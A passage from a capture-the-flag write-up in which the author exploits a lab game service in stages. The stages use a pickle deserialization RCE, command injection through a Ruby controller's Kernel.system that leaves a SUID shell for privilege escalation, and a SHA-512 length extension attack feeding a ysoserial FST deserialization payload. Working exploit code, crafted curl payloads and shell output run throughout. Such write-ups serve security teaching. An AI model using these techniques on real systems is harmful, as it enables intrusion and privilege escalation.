[logs] $ blowsmoke amon2 %41%42%43%44
Smoke bellows from the lips of amon2 to form the words, "%41%42%43%44."
Curling and curling...
The words float up high into the air and eventually disappate.
[logs] $ read logs-amon2
You read the writing on the note:
ABCD
[logs] $
```

The exploit so far remains the same as in stage 1 but we need to include retrieving the
`golden-hookah.`

```python
    # Teleport to the location of the golden-hookah.
    log.info('Teleporting to under-a-giant-mushroom to get the golden-hookah...')
    mushroom = ('sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-'
                'the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom')
    c.sendline('teleport ' + mushroom)
    c.get(b'golden-hookah')
```

Next, we need to teleport to the `/opt/wonderlands/logs` directory, generate the Python pickle
payload with the bypass, encode where appropriate, and trigger the write.

```python
    # Teleport to /opt/wonderland/logs/
    log.info('Teleporting to /opt/wonderland/logs')
    c.sendline(b'teleport ../../../../../../opt/wonderland/logs')
    c.get_until_prompt()

    # Generate the payload and write an item to the logs directory.
    log.info('Generating pickle RCE payload...')
    payload = quote(pickle.dumps(Exploit()), safe='').encode('ascii')
    random_filename = str(uuid.uuid4()).encode('ascii')
    log.info('Writing payload to {}.item'.format(random_filename.decode('ascii')))
    c.sendline(b'blowsmoke ' + random_filename + b'.item ' + payload)
    c.get_until_prompt()
```

Finally, we can trigger the deserialization and get a `/bin/sh` shell using a 'get' command. We can
automate the execution of the SUID flag binary as well to obtain the flag. For further exploration,
we drop into an interactive session.

```python
    # Trigger the RCE.
    log.info('Triggering RCE...')
    c.sendline(b'get logs-' + random_filename)
    c.get_until_prompt()
    c.get_until_prompt()

    # Get the flag.
    log.info('Getting the flag by executing /home/rabbit/flag2.bin')
    log.success('Flag 2:')
    c.sendline('/home/rabbit/flag2.bin')
    c.sendline('echo END_OF_FLAG')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()
```

Running the exploit:

```shell
root@f3c66932cfee:/opt/wonderland# ./2_insecure_dill_loads.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[↘] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Teleporting to under-a-giant-mushroom to get the golden-hookah...
[*] Teleporting to /opt/wonderland/logs
[*] Generating pickle RCE payload...
[*] Writing payload to 13c0671d-1f84-4ae4-a22f-002f8be16899.item
[*] Triggering RCE...
[*] Getting the flag by executing /home/rabbit/flag2.bin
[+] Flag 2:
[+] TISC{flag2}

[+] Enjoy your shell!
[*] Switching to interactive mode

$ id
uid=1000(rabbit) gid=1000(rabbit) groups=1000(rabbit)
$
```

The full exploit can be found in `2_insecure_dill_loads.py`.


### Stage 3: Advice from a Caterpillar

The challenge text for this stage is:

```
The flowers said that the French Mouse was invited. But to what? Perhaps she hid the invitation in
her warren. It is said that her home is decorated with all sorts of oddly shaped mirrors but the
tragic thing is that she's afraid of her own reflection.

The game is hosted at `172.17.0.1:31337`.
```

#### Exploring the Shell

Now that a shell is obtained, we can explore the environment a bit. There is a user called `mouse`
who has a home directory you want to get into, according to the challenge text. This corresponds to
what you see in the environment:

```shell
$ ls -la /home/
total 20
drwxr-xr-x 1 root root   4096 May 28 17:11 .
drwxr-xr-x 1 root root   4096 Jun  6 22:29 ..
dr-xr-x--- 1 root hatter 4096 May 28 17:14 hatter
dr-xr-x--- 1 root mouse  4096 May 28 17:14 mouse
dr-xr-x--- 1 root rabbit 4096 May 28 17:14 rabbit
$
```

Another interesting thing is that the `/opt/wonderland/logs` directory has the group set to `mouse`
and writable permissions are set for it. This implies that the `mouse` user runs the `pool-of-tears`
service.

```shell
$ ls -la /opt/wonderland/logs
total 8
drwxrwxr-x 1 root mouse 4096 Jun  7 23:20 .
drwxr-xr-x 1 root root  4096 May 28 17:11 ..
$
```

Going back to `/opt/wonderland/pool-of-tears/app/controllers/smoke_controller.rb`, we can see that
we now have control over more of the parameters since we can make requests via CURL.

```shell
$ curl localhost:4000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     2    0     2    0     0    400      0 --:--:-- --:--:-- --:--:--   400
OK$
```

If we pass the following:

* `ctype = "Kernel"`
* `cop = "system"`
* `uniqid = "../../../../../../bin/bash"`
* `cargs = ["-c", "touch /tmp/testing"]`
* `content = "x"`

Then we can coerce the controller to execute the following:

```ruby
Kernel.system("/opt/wonderland/logs/../../../../../../bin/bash", "-c", "touch /tmp/testing")
```

To test this out:

```shell
$ ls -la /tmp
total 20
drwxrwxrwt 1 root   root   4096 Jun  7 23:28 .
drwxr-xr-x 1 root   root   4096 Jun  6 22:29 ..
drwxrwx-wx 1 root   root   4096 Jun  7 00:33 hackers_use_me
drwxr-xr-x 2 hatter hatter 4096 Jun  7 00:52 hsperfdata_hatter
drwxr-xr-x 1 root   root   4096 May 28 17:14 hsperfdata_root
$ curl 'http://localhost:4000/api/v1/smoke?uniqid=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fbin%2Fbash&ctype=Kernel&cop=system&cargs[]=-c&cargs[]=touch%20%2Ftmp%2Ftesting&content=potato'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    28    0    28    0     0   1400      0 --:--:-- --:--:-- --:--:--  1400
Type is not implemented yet.
$ ls -la /tmp
total 20
drwxrwxrwt 1 root   root   4096 Jun  7 23:31 .
drwxr-xr-x 1 root   root   4096 Jun  6 22:29 ..
drwxrwx-wx 1 root   root   4096 Jun  7 00:33 hackers_use_me
drwxr-xr-x 2 hatter hatter 4096 Jun  7 00:52 hsperfdata_hatter
drwxr-xr-x 1 root   root   4096 May 28 17:14 hsperfdata_root
-rw-r--r-- 1 mouse  mouse     0 Jun  7 23:31 testing
$
```

Notice that the owner of the new `/tmp/testing` file is `mouse`. This confirms the arbitrary code
execution.

#### Crafting an Exploit

As with the previous stage, all exploit code remains the same and is extended for this stage.

After the first dill RCE has been triggered and we get a `rabbit` shell, a CURL command with the
payload to copy `/bin/sh` to `/tmp/hackers_use_me/pwn` and set it SUID is constructed. This request
is then sent to create a way for us to escalate to the `mouse` user.

```python
    # Create a mouse SUID shell via the pool-of-tears constantize vulnerability.
    # Construct the URL
    log.info('Constructing pool-of-tears exploit URL.')
    binbash = quote('../../../../../../../bin/bash', safe='')
    cmd_args = [
        'cp /bin/sh /tmp/hackers_use_me/pwn',
        'chmod +x /tmp/hackers_use_me/pwn',
        'chmod +s /tmp/hackers_use_me/pwn'
    ]
    cmd = quote(';'.join(cmd_args), safe='')
    exploit_url = ('http://localhost:4000/api/v1/smoke?uniqid={}&ctype=Kernel&cop=system&'
                   'cargs[]=-c&cargs[]={}&content=potato').format(binbash, cmd)
    # Send the exploit to abuse Kernel.system to create a mouse SUID binary.
    log.info('Sending curl request to trigger the creation of the SUID binary.')
    c.sendline("curl '{}'".format(exploit_url))
    c.recvuntil('Type is not implemented yet.')
```

Next, the escalation is triggered. We are now successfully acting as the `mouse` user.

```python
    # Trigger the privilege escalation, /bin/sh -p.
    log.info('Triggering the SUID binary to escalate to the mouse user.')
    c.sendline('/tmp/hackers_use_me/pwn -p')
```

The binary is removed so that others who may stumble across it do not have access to it.

```python
    # Remove the binary.
    log.info('Removing the SUID binary to clean up the tracks.')
    c.sendline('rm /tmp/hackers_use_me/pwn')
```

Finally, the flag is retrieved by executing yet another SUID wrapper and an interactive shell is
dropped.

```python
    # Get the flag.
    log.info('Getting the flag by executing /home/mouse/flag3.bin')
    log.success('Flag 3:')
    c.sendline('/home/mouse/flag3.bin')
    c.sendline('echo END_OF_FLAG')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()
```

Running the exploit:

```shell
root@58cc9472a197:/opt/wonderland# ./3_constantize_send.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[-] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Teleporting to under-a-giant-mushroom to get the golden-hookah...
[*] Teleporting to /opt/wonderland/logs
[*] Generating pickle RCE payload...
[*] Writing payload to 7f95eb84-7605-4f74-b853-be9b7373b51f.item
[*] Triggering RCE...
[*] Constructing pool-of-tears exploit URL.
[*] Sending curl request to trigger the creation of the SUID binary.
[*] Triggering the SUID binary to escalate to the mouse user.
[*] Removing the SUID binary to clean up the tracks.
[*] Getting the flag by executing /home/mouse/flag3.bin
[+] Flag 3:
[+] TISC{flag3}

[+] Enjoy your shell!
[*] Switching to interactive mode

$ id
uid=1000(rabbit) gid=1000(rabbit) euid=1001(mouse) egid=1001(mouse) groups=1001(mouse)
$
```

The full exploit can be found in `3_constantize_send.py`.



### Stage 4: A Mad Tea Party

The challenge text for this stage is:

```
Attend the Mad Tea Party but come back with (what's in) the Hatter's head. Sometimes the end of a
tale might not be the end of the story. Things that don't make logical sense can safely be ignored.
Do not eat that tiny Hello Kitty.

The game is hosted at `172.17.0.1:31337`.
```

#### Finding the Invitation

An interesting Unbirthday Invitation letter containing a curious UUID is located at `/home/mouse`.

```shell
$ cd /home/mouse
$ ls -la
total 48
dr-xr-x--- 1 root mouse   4096 May 28 17:14 .
drwxr-xr-x 1 root root    4096 May 28 17:11 ..
-r--r----- 1 root mouse    220 Feb 25  2020 .bash_logout
-r--r----- 1 root mouse   3771 Feb 25  2020 .bashrc
-r--r----- 1 root mouse    807 Feb 25  2020 .profile
-r--r----- 1 root mouse    518 May 28 17:12 an-unbirthday-invitation.letter
-r--r----- 1 root mouse     12 May 23 11:28 flag2
-rwxr-sr-x 1 root hatter 16952 May 28 17:14 flag3.bin
$ cat an-unbirthday-invitation.letter
Dear French Mouse,

    The March Hare and the Mad Hatter
        request the pleasure of your company
            for an tea party evening filled with
                clocks, food, fiddles, fireworks & more


    Last Month
        25:60 p.m.
            By the Stream, and Into the Woods
                Also available by way of port 4714

    Comfortable outdoor attire suggested

PS: Dormouse will be there!

By the way, please quote the following before entering the party:


b320520d-eb5b-4c33-9257-a7ba0f55707c
$
```

The letter also mentions the port 4714. Connecting to it shows us some kind of prompt.

```shell
$ nc localhost 4714
Welcome to the March Hare's and Mad Hatter's Tea Party.
It's your Unbirthday! Hopefully...
Before we let you in, though... Why is a raven like a writing desk?
Invitation Code: $
```

Entering the invitation code presents us with this Cake Designer Interface.

```shell
Correct! Welcome!
Come on into the party! But first, let's design you a cake!

[Cake Designer Interface v4.2.1]
  1. Set Name.
  2. Set Candles.
  3. Set Caption.
  4. Set Flavour.
  5. Add Firework.
  6. Add Decoration.

  7. Cake to Go.
  8. Go to Cake.
  9. Eat Cake.

  0. Leave the Party.

[Your cake so far:]

name: "A Plain Cake"
candles: 31337
flavour: "Vanilla"

Choice: $
```

This appears to be some kind of menu-based program. Taking a step back to look at the
`/opt/wonderland/` directory once more shows us that there is a `/opt/wonderland/a-mad-tea-party`
directory containing a familiar looking letter.

```shell
$ ls -la /opt/wonderland/a-mad-tea-party
total 32
drwxr-xr-x 1 root root 4096 May 28 17:11 .
drwxr-xr-x 1 root root 4096 May 28 17:11 ..
-rwxr-xr-x 1 root root  314 May 27 00:19 .gitignore
-rwxr-xr-x 1 root root    0 May 25 20:34 .keep
-rwxr-xr-x 1 root root  481 May 26 15:20 an-unbirthday-invitation.letter
-rwxr-xr-x 1 root root  188 May 26 23:55 build.sh
drwxr-xr-x 1 root root 4096 May 26 23:47 proto
-rwxr-xr-x 1 root root  239 May 27 13:11 run.sh
drwxr-xr-x 1 root root 4096 May 28 17:13 tea-party
$
```

#### Understanding the Application

Checking the `run.sh` file tells us that the application we are interacting with is written in Java.

```shell
$ cat run.sh
#!/bin/bash

export INVITATION_CODE=`cat /home/$USER3/invitation_code`
cd $BASE_DIR/a-mad-tea-party
# Instances only can last for 15 minutes.
timeout --foreground -k 5s 15m java -jar tea-party/target/tea-party-1.0-SNAPSHOT.jar 2>/dev/null
$
```

Additionally, protobuf also appears to be involved:

```proto
$ cat proto/cake.proto
syntax = "proto2";

option java_multiple_files = true;
option java_package = "com.mad.hatter.proto";
option java_outer_classname = "CakeProtos";

message Cake {
    optional string name = 1;
    optional int32 candles = 2;
    optional string caption = 3;
    optional string flavour = 4;
    repeated bytes fireworks = 5;

    enum Decoration {
        CHOCOLATE_SPRINKLES = 0;
        RAINBOW_SPRINKLES = 1;
        BOBA = 2;
        NATA_DE_COCO = 3;
        CHOCOLATE_CHIPS = 4;
        WHIPPED_CREAM = 5;
        TINY_HELLO_KITTY = 6;
    }

    repeated Decoration decorations = 6;
}
$
```

Happily, the compiled target and the original source files appear to be intact.

```shell
$ find tea-party
tea-party
tea-party/target
tea-party/target/generated-sources
tea-party/target/generated-sources/annotations
tea-party/target/classes
tea-party/target/classes/com
tea-party/target/classes/com/mad
tea-party/target/classes/com/mad/hatter
...
tea-party/target/archive-tmp
tea-party/target/tea-party-1.0-SNAPSHOT.jar
tea-party/target/maven-status
tea-party/target/maven-status/maven-compiler-plugin
tea-party/target/maven-status/maven-compiler-plugin/compile
tea-party/target/maven-status/maven-compiler-plugin/compile/default-compile
tea-party/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
tea-party/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
tea-party/pom.xml
tea-party/src
tea-party/src/test
tea-party/src/test/java
tea-party/src/test/java/com
tea-party/src/test/java/com/mad
tea-party/src/test/java/com/mad/hatter
tea-party/src/test/java/com/mad/hatter/AppTest.java
tea-party/src/main
tea-party/src/main/java
tea-party/src/main/java/com
tea-party/src/main/java/com/mad
tea-party/src/main/java/com/mad/hatter
tea-party/src/main/java/com/mad/hatter/RomanCandle.java
tea-party/src/main/java/com/mad/hatter/Firefly.java
tea-party/src/main/java/com/mad/hatter/Fountain.java
tea-party/src/main/java/com/mad/hatter/Firework.java
tea-party/src/main/java/com/mad/hatter/proto
tea-party/src/main/java/com/mad/hatter/proto/CakeOrBuilder.java
tea-party/src/main/java/com/mad/hatter/proto/CakeProtos.java
tea-party/src/main/java/com/mad/hatter/proto/.keep
tea-party/src/main/java/com/mad/hatter/proto/Cake.java
tea-party/src/main/java/com/mad/hatter/App.java
tea-party/src/main/java/com/mad/hatter/Firecracker.java
$
```

The file that contains the main logic loop is `tea-party/src/main/java/com/mad/hatter/App.java`. It
first initialises a byte array with the `get_secret()` function.

```java
/**
 * Hello! I'm your friendly party organiser and cake designer!
 *
 */
public class App {

    static FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration();

    public static void main(String[] args) throws IOException {
        // Get the secret bytes.
        byte[] secret = get_secret();
        ...
    }

    ...

    public static byte[] get_secret() throws IOException {
        // Read the secret from /home/hatter/secret.
        byte[] data = FileUtils.readFileToByteArray(new File("/home/hatter/secret"));
        if (data.length != 32) {
            System.out.println("Secret does not match the right length!");
        }
        return data;
    }
```

Of course, this secret is not readable but we know that its length is 32.

```shell
$ cat /home/hatter/secret
cat: /home/hatter/secret: Permission denied
$
```

Next, it gets the invitation code from an environment variable, sets up a default `Cake` builder
object and checks the user supplied code for validity.

```java
        // Get the invitation code.
        String invitation_code = System.getenv("INVITATION_CODE").trim();

        // Initialise some common variables.
        Scanner scanner = new Scanner(System.in);

        // Create a cake with some simple defaults.
        Cake.Builder cakep = Cake.newBuilder()
            .setName("A Plain Cake")
            .setCandles(31337)
            .setFlavour("Vanilla");

        // Print the Banner
        System.out.println("Welcome to the March Hare's and Mad Hatter's Tea Party.");
        System.out.println("It's your Unbirthday! Hopefully...");
        System.out.println("Before we let you in, though... Why is a raven like a writing desk?");

        // Get the invitation code and check it.
        System.out.print("Invitation Code: ");
        String user_invite = scanner.next().trim();
        if (!user_invite.equals(invitation_code)) {
            System.out.println("That invitation code was wrong! Begone and good day!");
            return;
        }
```

If it is correct, it goes into an `evaluate` loop. This appears to be what is powering the menu.

```java
        System.out.println("Correct! Welcome!");
        System.out.println("Come on into the party! But first, let's design you a cake!");

        // Run the main loop.
        boolean running = true;

        try {
            while (running) {
                running = evaluate(scanner, cakep, secret);
            }
        } catch (Exception e) {
            e.printStackTrace(System.out);
        }
```

Indeed, the `evaluate` function prints the expected menu and receives an integer from the user. It
also curiously prints the `Cake.Builder` object.

```java
    public static boolean evaluate(Scanner scanner, Cake.Builder cakep, byte[] secret) {
        System.out.println("\n[Cake Designer Interface v4.2.1]");
        System.out.println("  1. Set Name.");
        System.out.println("  2. Set Candles.");
        System.out.println("  3. Set Caption.");
        System.out.println("  4. Set Flavour.");
        System.out.println("  5. Add Firework.");
        System.out.println("  6. Add Decoration.\n");
        System.out.println("  7. Cake to Go.");
        System.out.println("  8. Go to Cake.");
        System.out.println("  9. Eat Cake.\n");
        System.out.println("  0. Leave the Party.");
        System.out.println("\n[Your cake so far:]\n");
        System.out.println(cakep);
        System.out.print("Choice: ");

        int choice = scanner.nextInt();
        boolean running = true;

        ...

    }
```

Most of the functionality appear to trivially set the properties of the protobuf builder.

```java
            case 1:
                scanner.nextLine();
                String name = scanner.nextLine().trim();
                cakep.setName(name);
                System.out.println("Name set!");
                break;
            case 2:
                int candles = scanner.nextInt();
                cakep.setCandles(candles);
                System.out.println("Number of candles set!");
                break;
            case 3:
                scanner.nextLine();
                String caption = scanner.nextLine().trim();
                cakep.setCaption(caption);
                System.out.println("Caption set!");
                break;
            case 4:
                scanner.nextLine();
                String flavour = scanner.nextLine().trim();
                cakep.setFlavour(flavour);
                System.out.println("Flavour set!");
                break;
```

However, the `Add Firework` option looks interesting as a list of bytes is manipulated. Note that
the `FSTConfiguration.asByteArray` is akin to JDK's `ObjectOutputStream.writeObject`. Thus, the code
is serializing `Fireworks` objects into bytes. More information on FST can be found
[here](https://github.com/RuedigerMoeller/fast-serialization/wiki/Serialization#simplest-use-at-least-read-this).

```java
    static FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration();

    ...

            case 5:
                if (cakep.getFireworksCount() < 5) {
                    System.out.println("Which firework do you wish to add?\n");
                    System.out.println("  1. Firecracker.");
                    System.out.println("  2. Roman Candle.");
                    System.out.println("  3. Firefly.");
                    System.out.println("  4. Fountain.");
                    System.out.print("\nFirework: ");

                    int firework_choice = scanner.nextInt();
                    Firework firework = new Firework();

                    switch (firework_choice) {
                        case 1:
                            firework = new Firecracker();
                            break;
                        case 2:
                            firework = new RomanCandle();
                            break;
                        case 3:
                            firework = new Firefly();
                            break;
                        case 4:
                            firework = new Fountain();
                            break;
                        default:
                            break;
                    }
                    byte[] firework_data = conf.asByteArray(firework);
                    cakep.addFireworks(ByteString.copyFrom(firework_data));
                    System.out.println("Firework added!");
                } else {
                    System.out.println("You already have too many fireworks!");
                }
                break;
```

However, we cannot directly control the contents of the field yet.

The `Cake To Go` option allows us to export a cake. The caveat here is that it also generates a
keyed hash digest to validate the integrity of the accompanying Base64 data.

```java
            case 7:

                byte[] cake_data = cakep.build().toByteArray();
                byte[] cake_b64 = Base64.encodeBase64(cake_data);

                try {
                    MessageDigest md = MessageDigest.getInstance("SHA-512");
                    byte[] combined = new byte[secret.length + cake_b64.length];
                    System.arraycopy(secret, 0, combined, 0, secret.length);
                    System.arraycopy(cake_b64, 0, combined, secret.length, cake_b64.length);
                    byte[] message_digest = md.digest(combined);
                    HashMap<String, String> hash_map = new HashMap<String, String>();
                    hash_map.put("digest", Hex.encodeHexString(message_digest));
                    hash_map.put("cake", Hex.encodeHexString(cake_b64));
                    String output = (new Gson()).toJson(hash_map);
                    System.out.println("Here's your cake to go:");
                    System.out.println(output);
                } catch (NoSuchAlgorithmException e) {
                    System.out.println("What how can this be?!?");
                }

                break;
```

The output to this command looks something like this:

```shell
Choice: $ 7
Here's your cake to go:
{"cake":"436778424946427359576c7549454e686132555136665142496764575957357062477868","digest":"5ac0d60cf76ab758f86f4ee7e254130999e5e8f278d368cb5b54fdd009d799697c913798df33093d883086d79a99daa98d4b8d7d119e32638c8c23a06cae020d"}
...
```

These decode to:

```python
In [511]: binascii.unhexlify('436778424946427359576c7549454e686132555136665142496764575957357062477868')
Out[511]: b'CgxBIFBsYWluIENha2UQ6fQBIgdWYW5pbGxh'

In [512]: base64.b64decode('CgxBIFBsYWluIENha2UQ6fQBIgdWYW5pbGxh')
Out[512]: b'\n\x0cA Plain Cake\x10\xe9\xf4\x01"\x07Vanilla'

In [513]:
```

The corresponding import function is the `Go To Cake` option. It does the inverse of the function
above and additional checks that the user supplied values match the digest computed. It basically
utilises the safe `parseFrom` protobuf API to reconstitute a `Cake` builder.

```java
            case 8:

                System.out.print("Please enter your saved cake: ");

                scanner.nextLine();
                String saved = scanner.nextLine().trim();

                try {

                    HashMap<String, String> hash_map = new HashMap<String, String>();
                    hash_map = (new Gson()).fromJson(saved, hash_map.getClass());
                    byte[] challenge_digest = Hex.decodeHex(hash_map.get("digest"));
                    byte[] challenge_cake_b64 = Hex.decodeHex(hash_map.get("cake"));
                    byte[] challenge_cake_data = Base64.decodeBase64(challenge_cake_b64);

                    MessageDigest md = MessageDigest.getInstance("SHA-512");
                    byte[] combined = new byte[secret.length + challenge_cake_b64.length];
                    System.arraycopy(secret, 0, combined, 0, secret.length);
                    System.arraycopy(challenge_cake_b64, 0, combined, secret.length,
                            challenge_cake_b64.length);
                    byte[] message_digest = md.digest(combined);

                    if (Arrays.equals(message_digest, challenge_digest)) {
                        Cake new_cakep = Cake.parseFrom(challenge_cake_data);
                        cakep.clear();
                        cakep.mergeFrom(new_cakep);
                        System.out.println("Cake successfully gotten!");
                    }
                    else {
                        System.out.println("Your saved cake went really bad...");
                    }

                } catch (DecoderException e) {
                    System.out.println("What what what?!?");
                } catch (InvalidProtocolBufferException e) {
                    System.out.println("No bueno!");
                } catch (NoSuchAlgorithmException e) {
                    System.out.println("What how can this be?!?");
                }

                break;
```

#### Discovering the Hash Length Extension Vulnerability

Note that the construct of the keyed hash is insecure. It constructs the hash like so:

```
H(K | M)
```

Where:

* H - The SHA512 hash function.
* K - The 32 bytes secret key.
* M - The protobuf message encoded as Base64.

This is flawed as hash algorithms based on the Merkle–Damgård construction are vulnerable to the
[Length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack) when used in this
manner.

Arbitrary data can be tacked onto the end of the message and pass the integrity check using this
primitive. This does come with the caveat that mandatory padding has to be insert between the
original data and the forged data.

The caveat can be sidestepped however, as most Base64 decoding utilities ignore non-valid Base64
characters.

```python
In [514]: base64.b64decode(b'CgxBIFBsYWluIENha2UQ\x80\x00\x00\x00\x00\x056fQBIgdWYW5pbGxh')
Out[514]: b'\n\x0cA Plain Cake\x10\xe9\xf4\x01"\x07Vanilla'
```

This tool can be used to carry out the attack: [HashPump](https://github.com/bwall/HashPump).

#### Discovering the FST Deserialization Vulnerability

The `Eat Cake` option has interesting behaviour.

```java
            case 9:
                System.out.println("You eat the cake and you feel good!");

                for (Cake.Decoration deco : cakep.getDecorationsList()) {
                    if (deco == Cake.Decoration.TINY_HELLO_KITTY) {
                        running = false;
                        System.out.println("A tiny Hello Kitty figurine gets lodged in your " +
                                "throat. You get very angry at this and storm off.");
                        break;
                    }
                }

                if (cakep.getFireworksCount() == 0) {
                    System.out.println("Nothing else interesting happens.");
                } else {
                    for (ByteString firework_bs : cakep.getFireworksList()) {
                        byte[] firework_data = firework_bs.toByteArray();
                        Firework firework = (Firework) conf.asObject(firework_data);
                        firework.fire();
                    }
                }
                break;
```

It basically cycles through the decorations and fireworks attached to the `Cake` object and does
some whimsical effects. If we run the choice with a few fireworks added:

```shell
Choice: $ 9
You eat the cake and you feel good!
Firefly! Firefly! Firefly! Firefly! Fire Fire Firefly!
*!*!* This string of firecrackers fizzle and spark angrily. *!*!*
Firefly! Firefly! Firefly! Firefly! Fire Fire Firefly!
This basic firework fizzles.

[Cake Designer Interface v4.2.1]
  1. Set Name.
  2. Set Candles.
  3. Set Caption.
  4. Set Flavour.
  5. Add Firework.
  6. Add Decoration.

  7. Cake to Go.
  8. Go to Cake.
  9. Eat Cake.

  0. Leave the Party.

[Your cake so far:]

name: "A Plain Cake"
candles: 31337
flavour: "Vanilla"
fireworks: "\000\001\026com.mad.hatter.Firefly\000"
fireworks: "\000\001\032com.mad.hatter.Firecracker\000"
fireworks: "\000\001\026com.mad.hatter.Firefly\000"
fireworks: "\000\001\027com.mad.hatter.Firework\000"

Choice: $
```

Notice that the output for the `fireworks` fields look like binary. This is a confirmation that
these fields hold some vastly interesting data.

As with the earlier discussion on `FSTConfiguration`, the `FSTConfiguration.asObject` call is akin
to `ObjectInputStream`. This implies that there is a deserialization sink here. In one of the
[issues
replied](https://github.com/RuedigerMoeller/fast-serialization/issues/166#issuecomment-258105502) to
by the creator of the library, he reaffirms that `fast-serialization` is source-compatible with JDK
Serialization but not binary-compatible. This further implies that we can use established
Java deserialization exploitation techniques and gadgets with FST if we modified existing custom
tools.

We can do this easily for [ysoserial](https://github.com/frohoff/ysoserial) by modifying these
files:

* pom.xml
* src/main/java/ysoserial/Serializer.java

For `pom.xml`, we need to add the following dependency:

```xml
    </dependency>
		<dependency>
			<groupId>de.ruedigermoeller</groupId>
			<artifactId>fst</artifactId>
			<version>2.56</version>
		</dependency>
	</dependencies>
```

For `Serializer.java`, we need to modify it so that it outputs FST binary.

```java
package ysoserial;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.concurrent.Callable;
import org.nustaq.serialization.FSTObjectOutput;

public class Serializer implements Callable<byte[]> {

	private final Object object;

	public FSTSerializer(Object object) {
		this.object = object;
	}

	public byte[] call() throws Exception {
		return serialize(object);
	}

	public static byte[] serialize(final Object obj) throws IOException {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		serialize(obj, out);
		return out.toByteArray();
	}

	public static void serialize(final Object obj, final OutputStream out) throws IOException {
		FSTObjectOutput fout = new FSTObjectOutput(out);
		fout.writeObject(obj);
		fout.close();
	}

}
```

A custom copy of an FST-enabled ysoserial fork can be found at `./ysoserial-fst-private-master/`. It
can be invoked from within the solutions container like so. Note that the output starts with `0001`
which looks very similar to the output from the serialized `Fireworks` object.

```shell
root@58cc9472a197:/opt/wonderland# java -jar ysoserial-fst-private-master/target/ysoserial-0.0.6-SNAPSHOT-all.jar -fst CommonsBeanutils1 ls | xxd
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by org.nustaq.serialization.FSTClazzInfo (file:/opt/wonderland/ysoserial-fst-private-master/target/ysoserial-0.0.6-SNAPSHOT-all.jar) to field java.lang.String.value
WARNING: Please consider reporting this to the maintainers of org.nustaq.serialization.FSTClazzInfo
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
00000000: 0001 176a 6176 612e 7574 696c 2e50 7269  ...java.util.Pri
00000010: 6f72 6974 7951 7565 7565 3763 0200 012b  orityQueue7c...+
00000020: 6f72 672e 6170 6163 6865 2e63 6f6d 6d6f  org.apache.commo
00000030: 6e73 2e62 6561 6e75 7469 6c73 2e42 6561  ns.beanutils.Bea
00000040: 6e43 6f6d 7061 7261 746f 7200 013f 6f72  nComparator..?or
...
```

#### Crafting Protobuf Fields Manually

Now that we have our means of forging appended data as well as the generation of the FST serialized
payload, our next goal is to construct the protobuf field to be appended. The ideal next step is to
create a fake fireworks field containing the attack payload.

To do this, we must first understand what varints and keys are from the [Protobuf Encoding
documentation](https://developers.google.com/protocol-buffers/docs/encoding). The official article
is excellent, please read until the 'Message Structure' section.

Since a protocol buffer message is a series of key-value pairs', we can simply add on an additional
key-value pair.

This is the field we want to construct:

```proto
    repeated bytes fireworks = 5;
```

In a nutshell, we have to lay it out like so:

```
[varint: field << 3 | wire type] [varint: length] [bytes: data]
```

Once this is constructed, we can encode it with Base64 and attempt to append it to the original
data.

#### Crafting an Exploit

As with the previous stages, the exploit in this section will expand on the previous one.

First, utilities to create varints and keys are defined with reference to the Protobuf
documentation:

```python
def encode_varint(number: int) -> bytes:
    '''Encodes a number into a varint.
    '''
    # First the number needs to be chunked up into groups of 7 bits.
    groups = []
    current_number = number
    while current_number > 0:
        current_group = current_number & 0x7f
        current_number = current_number >> 7
        groups.append(current_group)

    # For each group, set the MSB based on the index and append them. The least significant group
    # starts first.
    result = b''
    for i, group in enumerate(groups):
        mask = 0x80
        # Do not set the MSB for the last byte.
        if i == len(groups) - 1:
            mask = 0x00
        result += bytes([mask | group])

    return result


def encode_key(field: int, wire_type: int) -> bytes:
    '''Encodes the key as a varint.

    Wire type can only take up 3 bits.
    '''
    key_number = (field << 3) | (wire_type & 0x7)
    return encode_varint(key_number)
```

Before contacting the server, we have to obtain the invitation code.

```python
    # Read the invitation.
    log.info('Reading the invitation code...')
    c.sendline(b'cat /home/mouse/an-unbirthday-invitation.letter')
    c.sendline(b'echo END_OF_FLAG')
    c.recvuntil(b'By the way, please quote the following before entering the party:')
    invitation_code = c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b'').strip()
    log.success("Got invitation code: {}".format(invitation_code.decode('utf-8')))
```

Next, the connection is opened using `nc` through the chain of shells and the invitation code is
submitted.

```python
    # Open a connection to the unbirthday party.
    c.sendline(b'nc localhost 4714')
    c.recvuntil(b'Invitation Code: ')
    c.sendline(invitation_code)
    c.recvuntil(b'Correct! Welcome!')
